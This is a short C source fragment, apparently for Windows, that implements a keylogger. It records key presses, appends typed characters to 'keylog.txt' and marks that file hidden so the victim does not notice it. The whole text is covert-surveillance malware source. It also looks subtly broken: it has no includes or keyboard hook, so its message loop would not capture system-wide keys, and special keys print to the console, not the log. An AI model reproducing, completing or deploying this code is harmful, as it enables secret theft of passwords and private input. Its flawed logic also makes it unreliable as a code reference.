// Function to log keystrokes
void logKey(int keyCode) {
    switch (keyCode) {
        case VK_BACK:  printf("[BACKSPACE]"); break;
        case VK_TAB:   printf("[TAB]");     break;
        case VK_RETURN:printf("[ENTER]");   break;
        case VK_SHIFT: printf("[SHIFT]");   break;
        case VK_CONTROL: printf("[CTRL]");    break;
        case VK_MENU:  printf("[ALT]");     break;
        default:       printf("%c", keyCode); break;
    }
}

int main() {
    FILE *logFile = fopen("keylog.txt", "a+");
    if (logFile == NULL) {
        perror("Unable to open log file");
        return 1;
    }

    // Hide the log file
    SetFileAttributes("keylog.txt", FILE_ATTRIBUTE_HIDDEN);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // Check for key presses
        if (msg.message == WM_KEYDOWN || msg.message == WM_SYSKEYDOWN) {
            int keyCode = msg.wParam;
            logKey(keyCode);
        } else if (msg.message == WM_CHAR) {
            putc(msg.wParam, logFile);
            fflush(logFile);
        }
    }

    fclose(logFile);
    return 0;
}

